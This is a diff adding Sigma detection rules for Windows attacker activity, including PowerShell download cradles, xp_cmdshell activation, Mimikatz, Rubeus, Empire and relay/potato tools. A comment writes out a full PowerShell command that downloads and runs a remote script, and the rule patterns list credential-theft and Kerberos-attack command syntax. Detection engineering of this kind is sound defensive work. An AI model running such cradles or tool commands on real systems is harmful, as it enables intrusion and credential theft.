@@ -128,4 +128,296 @@ falsepositives:
 - None
 level: high
 
+title: Payload downloaded via PowerShell
+description: Detects scenarios where an attacker download a payload using PowerShell.
+tags:
+- attack.execution
+- attack.t1059.001 # Command and Scripting Interpreter: PowerShell 
+- attack.command_and_control
+- attack.t1105 # Ingress Tool Transfer 
+logsource:
+  product: windows
+  category:
+    - ps_module
+    - ps_classic_script
+    - ps_script
+detection: # full command: "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
+  selection_powershell_native:
+    EventID: 800
+    EventData|contains: 'WebClient'
+    EventData|contains:
+      - ".DownloadString("
+      - ".DownloadStringAsync("
+      - ".DownloadFile("
+      - ".DownloadData("
+    EventData|contains: 
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+
+  selection_powershell_modern:
+    EventID: 4103
+    Payload|contains: 'WebClient'
+    Payload|contains:
+      - ".DownloadString("
+      - ".DownloadStringAsync("
+      - ".DownloadFile("
+      - ".DownloadData("
+    Payload|contains: 
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+
+  selection_powershell_block:
+    EventID: 4104
+    ScriptBlockText|contains: 'WebClient'
+    ScriptBlockText|contains:
+      - ".DownloadString("
+      - ".DownloadStringAsync("
+      - ".DownloadFile("
+      - ".DownloadData("
+    ScriptBlockText|contains: 
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+
+  condition: selection_powershell_native or selection_powershell_modern or selection_powershell_block
+falsepositives:
+- Scripts donwloading files
+level: high
+
+
+
+title: SQL server sqlcmd utility abuse for privilege escalation
+description: Detects scenarios where an attacker uses sqlcmd utility to escalate privileges or introduce weaknesses.
+
+tags:
+- attack.persistence
+- attack.t1505.001
+- 
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    NewProcessName|endswith:
+      - '\sqlcmd.exe'     # used in recent SQL Server versions
+      - '\osql.exe'       # used in old SQL server version
+    CommandLine|contains: # specify the database\instance'
+      - /S
+      - -S
+    CommandLine|contains: # runs a query and immediately exists
+      - /Q
+      - -Q
+  condition: selection
+falsepositives:
+- Master database restore procedure
+- Maintenance operation
+- Legitim SA account password recovery
+level: high
+
+title: SQL Server xp_cmdshell activation (native event)
+description: Detects scenarios where an attacker enable the xp_cmdshell in order to execute non SQL content and escalate privileges
+
+tags:
+- attack.persistence
+- attack.T1505
+author: mdecrevoisier
+status: experimental
+logsource:
+  product: mssql
+  category: application
+detection:
+  selection_baseline:
+    EventID: 15457
+
+  selection_raw: # Safest approach, not localized and not dependent on system and application language
+    EventData|contains: '<Data>xp_cmdshell</Data><Data>0</Data><Data>1</Data>' # 0 is for previous status and 1 for new status
+
+  selection_enriched: # Alternative method using Message. However this field may be in a different language and dropped in some cases during collection phase
+    Message|contains: "option 'xp_cmdshell' changed from 0 to 1"
+
+  condition: selection_baseline and (selection_raw or selection_enriched)
+falsepositives:
+- None
+level: high
+
+
+image_load_cmstp_load_dll_from_susp_location.yml
+title: DLL Loaded From Suspicious Location Via Cmspt.EXE
+tags:
+    - attack.defense_evasion
+    - attack.t1218.003
+logsource:
+    category: image_load
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\cmstp.exe'
+        ImageLoaded|contains:
+            # Add more suspicious paths as you see fit in your env
+            - '\PerfLogs\'
+            - '\ProgramData\'
+            - '\Users\'
+            - '\Windows\Temp\'
+            - 'C:\Temp\'
+        ImageLoaded|endswith:
+            - '.dll'
+            - '.ocx'
+    condition: selection
+falsepositives:
+    - Unikely
+level: high
+
+title: HackTool - Empire PowerShell Launch Parameters
+tags:
+    - attack.execution
+    - attack.t1059.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        CommandLine|contains:
+            - ' -NoP -sta -NonI -W Hidden -Enc '
+            - ' -noP -sta -w 1 -enc '
+            - ' -NoP -NonI -W Hidden -enc '
+            - ' -noP -sta -w 1 -enc'
+            - ' -enc  SQB'
+            - ' -nop -exec bypass -EncodedCommand '
+    condition: selection
+falsepositives:
+    - Other tools that incidentally use the same command line parameters
+level: high
+
+title: HackTool - Mimikatz Execution
+
+tags:
+    - attack.credential_access
+    - attack.t1003.001
+    - attack.t1003.002
+    - attack.t1003.004
+    - attack.t1003.005
+    - attack.t1003.006
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_tools_name:
+        CommandLine|contains:
+            - 'DumpCreds'
+            - 'mimikatz'
+    selection_function_names: # To cover functions from modules that are not in module_names
+        CommandLine|contains:
+            - '::aadcookie' #misc module
+            - '::detours' #misc module
+            - '::memssp' #misc module
+            - '::mflt' #misc module
+            - '::ncroutemon' #misc module
+            - '::ngcsign' #misc module
+            - '::printnightmare' #misc module
+            - '::skeleton' #misc module
+            - '::preshutdown'  #service module
+            - '::mstsc'  #ts module
+            - '::multirdp'  #ts module
+    selection_module_names:
+        CommandLine|contains:
+            - 'rpc::'
+            - 'token::'
+            - 'crypto::'
+            - 'dpapi::'
+            - 'sekurlsa::'
+            - 'kerberos::'
+            - 'lsadump::'
+            - 'privilege::'
+            - 'process::'
+            - 'vault::'
+    condition: 1 of selection_*
+falsepositives:
+    - Unlikely
+level: high
+
+title: Potential SMB Relay Attack Tool Execution
+tags:
+    - attack.execution
+    - attack.t1557.001
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_pe:
+        Image|contains:
+            - 'PetitPotam'
+            - 'RottenPotato'
+            - 'HotPotato'
+            - 'JuicyPotato'
+            - '\just_dce_'
+            - 'Juicy Potato'
+            - '\temp\rot.exe'
+            - '\Potato.exe'
+            - '\SpoolSample.exe'
+            - '\Responder.exe'
+            - '\smbrelayx'
+            - '\ntlmrelayx'
+            - '\LocalPotato'
+    selection_script:
+        CommandLine|contains:
+            - 'Invoke-Tater'
+            - ' smbrelay'
+            - ' ntlmrelay'
+            - 'cme smb '
+            - ' /ntlm:NTLMhash '
+            - 'Invoke-PetitPotam'
+            - '.exe -t * -p '  # JuicyPotatoNG pattern https://github.com/antonioCoco/JuicyPotatoNG
+    selection_juicypotato_enum:  # appears when JuicyPotatoNG is used with -b
+        CommandLine|contains: '.exe -c "{'
+        CommandLine|endswith: '}" -z'
+    filter_hotpotatoes:  # known goodware https://hotpot.uvic.ca/
+        Image|contains:
+            - 'HotPotatoes6'
+            - 'HotPotatoes7'
+            - 'HotPotatoes ' # Covers the following: 'HotPotatoes 6', 'HotPotatoes 7', 'HotPotatoes Help', 'HotPotatoes Tutorial'
+    condition: 1 of selection_* and not 1 of filter_*
+falsepositives:
+    - Legitimate files with these rare hacktool names
+level: critical
+
+title: HackTool - Rubeus Execution
+tags:
+    - attack.credential_access
+    - attack.t1003
+    - attack.t1558.003
+    - attack.lateral_movement
+    - attack.t1550.003
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        - Image|endswith: '\Rubeus.exe'
+        - OriginalFileName: 'Rubeus.exe'
+        - Description: 'Rubeus'
+        - CommandLine|contains:
+            - 'asreproast '
+            - 'dump /service:krbtgt '
+            - 'dump /luid:0x'
+            - 'kerberoast '
+            - 'createnetonly /program:'
+            - 'ptt /ticket:'
+            - '/impersonateuser:'
+            - 'renew /ticket:'
+            - 'asktgt /user:'
+            - 'harvest /interval:'
+            - 's4u /user:'
+            - 's4u /ticket:'
+            - 'hash /password:'
+            - 'golden /aes256:'
+            - 'silver /user:'
+    condition: selection
+falsepositives:
+    - Unlikely
+level: critical
+
 
